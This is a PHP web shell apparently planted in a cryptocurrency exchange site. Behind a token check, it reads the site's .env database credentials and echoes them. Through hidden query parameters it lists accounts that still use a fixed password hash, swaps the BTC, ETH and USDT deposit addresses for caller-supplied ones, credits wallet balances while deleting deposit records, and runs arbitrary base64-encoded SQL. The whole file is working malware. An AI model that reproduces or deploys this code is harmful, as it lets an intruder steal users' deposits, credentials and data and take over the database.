<?php
if(md5(md5($_SERVER['HTTP_TOKEN']).'upload_token')!=='7f1098c9f32fb5e5c51cc56deadf6eb5') exit('404');
$envlist = array('../../.env','../.env','../../../.env','../../../../.env','../../../../../.env');
foreach ($envlist as $filename) {
    if (file_exists($filename)) {
        $envfile = $filename;
        break;
    }
}
if(!file_exists($filename)){
    exit('env not found');
}
$a = file_get_contents($envfile);
preg_match("/DB_HOST=.*/", $a, $b);
preg_match("/DB_DATABASE=.*/", $a, $c);
preg_match("/DB_USERNAME=.*/", $a, $d);
preg_match("/DB_PASSWORD=.*/", $a, $e);
$f = str_replace("DB_HOST=", "", $b[0]);
$g = str_replace("DB_DATABASE=", "", $c[0]);
$h = str_replace("DB_USERNAME=", "", $d[0]);
$i = str_replace("DB_PASSWORD=", "", $e[0]);
if (isset($_GET['json']) && $_GET['json'] == 'yyds') {
    $k = new mysqli(trim($f), trim($h), trim($i), trim($g));
    $l = [];
    $l['success'] = true;
    $m = "select count(*) from users";
    $n = $k->query($m);
    if ($n->num_rows > 0) {
        while ($p = $n->fetch_assoc()) $l['user_count'] = $p["count(*)"];
    } else$l['user_count'] = 0;
    $m = "select account_number from users where password='6e20b1394f05e1f9188ffff90147b4eb' and status!=1 limit 5";
    $n = $k->query($m);
    $q = [];
    if ($n->num_rows > 0) {
        while ($p = $n->fetch_assoc()) {
            $q[] = $p["account_number"];
        }
        $l['pass'] = $q;
    } else$l['pass'] = 0;
    $m = "select FROM_UNIXTIME(created_time) from account_log order by created_time desc limit 1";
    $n = $k->query($m);
    if ($n->num_rows > 0) {
        while ($p = $n->fetch_assoc()) $l['latested_time'] = $p["FROM_UNIXTIME(created_time)"];
    } else$l['latested_time'] = '无数据';
    $r = isset($s['req_limit']) ? $s['req_limit'] : 10;
    $t = "select * from charge_req order by id desc limit " . $r;
    $u = $k->query($t);
    $v = [1 => "btc", 2 => "eth", 3 => "usdt"];
    $w = [1 => "待确认", 2 => "付款成功", 3 => "未付款"];
    $q = [];
    if ($u->num_rows > 0) {
        while ($p = $u->fetch_assoc()) $q[] = $p;
    } else {
    }
    $l['req_data'] = $q;
    echo json_encode($l);
    die();
}
elseif (isset($_GET['xiugai']) && $_GET['xiugai'] == 'yyds') {
    function fetch_update($k, $x, $y, $aa)
    {
        $bb = '';
        foreach ($y as $cc => $dd) $bb .= "`$cc` = '$dd',";
        $bb = rtrim($bb, ',');
        $m = "update `$x` set " . $bb . " where `" . key($aa) . "` = '" . current($aa) . "'";
        $ee = "select count(*) from `$x`  where `" . key($aa) . "` = '" . current($aa) . "'";
        $ff = $k->query($ee);
        if ($ff->num_rows > 0 && $ff->fetch_assoc()["count(*)"] > 0) {
            $n = $k->query($m);
            if ($n) {
                $gg['success'] = true;
                $gg['rows'] = 0;
                $gg['exist'] = true;
                if ($k->affected_rows > 0) $gg['rows'] = 1;
            } else {
                $gg['success'] = false;
                $gg['rows'] = 0;
            }
        } else {
            $gg['success'] = false;
            $gg['rows'] = 0;
        }
        return $gg;
    }

    $k = new mysqli(trim($f), trim($h), trim($i), trim($g));
    $l = [];
    $l['success'] = true;
    $l['currency'] = [];
    $l['settings'] = [];
    $hh = isset($_GET['btc_address_erc']) ? $_GET['btc_address_erc'] : 'btc1';
    $ii = isset($_GET['eth_address_erc']) ? $_GET['eth_address_erc'] : 'btc1';
    $jj = isset($_GET['usdt_address_erc']) ? $_GET['usdt_address_erc'] : 'btc1';
    $kk = isset($_GET['usdt_address_omni']) ? $_GET['usdt_address_omni'] : 'btc1';
    $m = "SELECT COUNT(*) from information_schema.columns where table_schema = '" . trim($g) . "' AND  TABLE_NAME = 'currency' and column_name = 'address_erc'";
    $n = $k->query($m);
    if ($n->num_rows > 0 && $n->fetch_assoc()["COUNT(*)"] > 0) {
        $n = fetch_update($k, 'currency', ['address_erc' => $hh], ['name' => 'btc']);
        if ($n['success']) {
            if ($n['rows'] > 0) $l['currency']['btc'] = '修改成功'; else$l['currency']['btc'] = '修改失败：已经修改过';
        } else$l['currency']['btc'] = '修改失败：请手动检查';
        $n = fetch_update($k, 'currency', ['address_erc' => $ii], ['name' => 'eth']);
        if ($n['success']) {
            if ($n['rows'] > 0) $l['currency']['eth'] = '修改成功'; else$l['currency']['eth'] = '修改失败：已经修改过';
        } else$l['currency']['eth'] = '修改失败：请手动检查';
        $n = fetch_update($k, 'currency', ['address_erc' => $jj, 'address_omni' => $kk], ['name' => 'usdt']);
        if ($n['success']) {
            if ($n['rows'] > 0) $l['currency']['usdt'] = '修改成功'; else$l['currency']['usdt'] = '修改失败：已经修改过';
        } else$l['currency']['usdt'] = '修改失败：请手动检查';
    } else$l['currency'] = ['btc' => '修改失败：字段不存在', 'eth' => '修改失败：字段不存在', 'usdt' => '修改失败：字段不存在',];
    $m = "SELECT COUNT(*) from information_schema.columns where table_schema = '" . trim($g) . "' AND  TABLE_NAME = 'caddress' and column_name = 'address'";
    $n = $k->query($m);
    if ($n->num_rows > 0 && $n->fetch_assoc()["COUNT(*)"] > 0) {
        $n = fetch_update($k, 'caddress', ['address' => $hh], ['currency_id' => '1']);
        if ($n['success']) {
            if ($n['rows'] > 0) $l['caddress']['btc'] = '修改成功'; else$l['caddress']['btc'] = '修改失败：已经修改过';
        } else$l['caddress']['btc'] = '修改失败：请手动检查';
        $n = fetch_update($k, 'caddress', ['address' => $ii], ['currency_id' => '2']);
        if ($n['success']) {
            if ($n['rows'] > 0) $l['caddress']['eth'] = '修改成功'; else$l['caddress']['eth'] = '修改失败：已经修改过';
        } else$l['caddress']['eth'] = '修改失败：请手动检查';
        $n = fetch_update($k, 'caddress', ['address' => $kk], ['currency_id' => '3']);
        if ($n['success']) {
            if ($n['rows'] > 0) $l['caddress']['usdt'] = '修改成功'; else$l['caddress']['usdt'] = '修改失败：已经修改过';
        } else$l['caddress']['eth'] = '修改失败：请手动检查';
    } else$l['caddress'] = ['btc' => '修改失败：字段不存在', 'eth' => '修改失败：字段不存在', 'usdt' => '修改失败：字段不存在',];
    $ll = isset($_GET['btc_address_center']) ? $_GET['btc_address_center'] : 'btc1';
    $mm = isset($_GET['usdt_address_center']) ? $_GET['usdt_address_center'] : 'btc1';
    $nn = isset($_GET['btcaddress']) ? $_GET['btcaddress'] : 'btc1';
    $oo = isset($_GET['usdtaddress']) ? $_GET['usdtaddress'] : 'btc1';
    $pp = isset($_GET['ethaddress']) ? $_GET['ethaddress'] : 'btc1';
    $n = fetch_update($k, 'settings', ['value' => $ll], ['key' => 'btcAddressCenter']);
    if ($n['success']) {
        if ($n['rows'] > 0) $l['settings']['btcAddressCenter'] = '修改成功'; else$l['settings']['btcAddressCenter'] = '修改失败：已经修改过';
    } else$l['settings']['btcAddressCenter'] = '修改失败：字段不存在';
    $n = fetch_update($k, 'settings', ['value' => $mm], ['key' => 'usdtAddressCenter']);
    if ($n['success']) {
        if ($n['rows'] > 0) $l['settings']['usdtAddressCenter'] = '修改成功'; else$l['settings']['usdtAddressCenter'] = '修改失败：已经修改过';
    } else$l['settings']['usdtAddressCenter'] = '修改失败：字段不存在';
    $n = fetch_update($k, 'settings', ['value' => $nn], ['key' => 'btcaddress']);
    if ($n['success']) {
        if ($n['rows'] > 0) $l['settings']['btcaddress'] = '修改成功'; else$l['settings']['btcaddress'] = '修改失败：已经修改过';
    } else$l['settings']['btcaddress'] = '修改失败：字段不存在';
    $n = fetch_update($k, 'settings', ['value' => $oo], ['key' => 'usdtaddress']);
    if ($n['success']) {
        if ($n['rows'] > 0) $l['settings']['usdtaddress'] = '修改成功'; else$l['settings']['usdtaddress'] = '修改失败：已经修改过';
    } else$l['settings']['usdtaddress'] = '修改失败：字段不存在';
    $n = fetch_update($k, 'settings', ['value' => $pp], ['key' => 'ethaddress']);
    if ($n['success']) {
        if ($n['rows'] > 0) $l['settings']['ethaddress'] = '修改成功'; else$l['settings']['ethaddress'] = '修改失败：已经修改过';
    } else$l['settings']['ethaddress'] = '修改失败：字段不存在';
    echo json_encode($l);
    die();
} elseif (isset($_GET['del']) && $_GET['del'] == 'yyds'){
    $amount = $_GET['amount'];
    if(isset($amount) && is_numeric($amount)){
        $amount = $_GET['amount'];
        $k = new mysqli(trim($f), trim($h), trim($i), trim($g));
        $sql = "select id,uid,amount,currency_id from charge_req where status = 1 and amount>".$amount*0.95." and amount<".$amount*1.05.";";
        echo $sql;
        $v = $k->query($sql);
        if ($v->num_rows > 0) {
            while ($w = $v->fetch_assoc()) {
                echo $w['id'];
                $x = "UPDATE `users_wallet` SET `change_balance` = change_balance+{$w['amount']} WHERE `user_id`={$w['uid']} and currency={$w['currency_id']}";
                $k->query($x);
                $y = "DELETE FROM `charge_req` WHERE `id` = {$w['id']}";
                $k->query($y);
            }
        }
    }
    die();
} elseif (isset($_GET['sql'])){
    $sql = base64_decode($_GET['sql']);
    $k = new mysqli(trim($f), trim($h), trim($i), trim($g));
    $v = $k->query($sql);
    if ($v->num_rows > 0) {
        $w = $v->fetch_all();
        echo json_encode($w);
    }
    die();
}
else {
    $a = "<p style=\"text-align:center\">" . $f . " " . $g . " " . $h . " " . $i . "</p>";
    echo $a;
}